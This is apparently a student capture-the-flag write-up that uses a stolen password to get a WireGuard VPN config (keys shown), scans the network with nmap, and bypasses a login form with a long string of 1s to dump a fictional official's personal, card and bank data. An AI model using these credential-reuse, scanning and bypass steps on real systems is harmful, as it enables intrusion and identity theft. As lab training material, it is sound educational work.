# Attack 4

By using Jonas Dahl's password, we were able to retrieve
the configuration details for WireGuard, a VPN service.

This is the configuration we used for connecting our computer to WireGuard.

```
[Interface]
PrivateKey = GBxMK5VGw0W6LF5+p9xYqFr75ocG8CAITDBiZjU+W0M=
Address = 10.13.13.12
DNS = 9.9.9.9

[Peer]
PublicKey = Yg6iNtA7+F6AWfnuqCzJPx2cdHKcYOXSvz0LNx4sMjs=
PresharedKey = vTlp8jvQbTQPrNR4KmAKUuyje0DwqCKBnwqS2QpaF9g=
Endpoint = 64.225.76.73:51820
AllowedIPs = 0.0.0.0/0
```

Then we scanned with `nmap 22 10.13.13.0/24`.

The result of the command gave us this:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-05 09:08 CET
Nmap scan report for 10.13.13.1
Host is up (0.015s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
8080/tcp open  http-proxy

Nmap scan report for 10.13.13.12
Host is up (0.000052s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.13.13.253
Host is up (0.016s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.13.13.254
Host is up (0.016s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 256 IP addresses (4 hosts up) scanned in 2.97 seconds
```
Now after having scanned all the available ports, we checked out all the HTTP servers, thar revealed a login page.

During logging in to the HTTP page, there was no visual result. We could however see the result in inspect element showing HTTP status 200, with JSON content of `{"error": "Login failed"}`.

The first thing we tried was to enter "1111111111111111111111111111...", and hopefully try to evaluate potential booleans to true. After trying that, we got this result:

```json
{
  "name": "Jonas Dahl",
  "email": "jonas.dahl@regjeringen.no",
  "address": {
    "street": "Regjeringsgata 16",
    "city": "Oslo",
    "postal_code": "1111",
    "country": "Norway"
  },
  "phone": "+47 123 45 678",
  "birthdate": "1985-06-15",
  "gender": "Male",
  "national_id": "15068512345",
  "passport_number": "N12345678",
  "nationality": "Norwegian",
  "occupation": "Technical Officer",
  "company": {
    "name": "Regjeringen",
    "address": {
      "street": "Regjeringsgata 16",
      "city": "Oslo",
      "postal_code": "1111",
      "country": "Norway"
    },
    "phone": "+47 987 65 432",
    "industry": "Government",
    "position": "Technical Officer",
    "department": "Technical and Infrastructure",
    "start_date": "2010-05-01",
    "manager": "Ingrid Nilsen",
    "manger_username": "ingridnilsen"
  },
  "credit_card": {
    "type": "Visa",
    "number": "4111 2222 3333 4444",
    "expiration": "12/26",
    "cvv": "234",
    "cardholder_name": "Jonas Dahl"
  },
  "bank_account": {
    "bank_name": "Statens Bank",
    "account_number": "1234.56.78910",
    "iban": "NO1234567890123",
    "swift_bic": "STBANOXX"
  },
  "hidden_details": {
    "security_question": "Hva var navnet på din første lærer?",
    "security_answer": "Frøken Andersen",
    "pin": "5678",
    "mother_maiden_name": "Larsen"
  },
  "flag": "Dropbox is the flag :)",
  "dropbox": "https://dropbox.internal.regjeringen.uiaikt.no/"
}
```

As we can see from this JSON file, there is a hint near the bottom, telling us that "Dropbox is the flag" and to visit the Dropbox website.
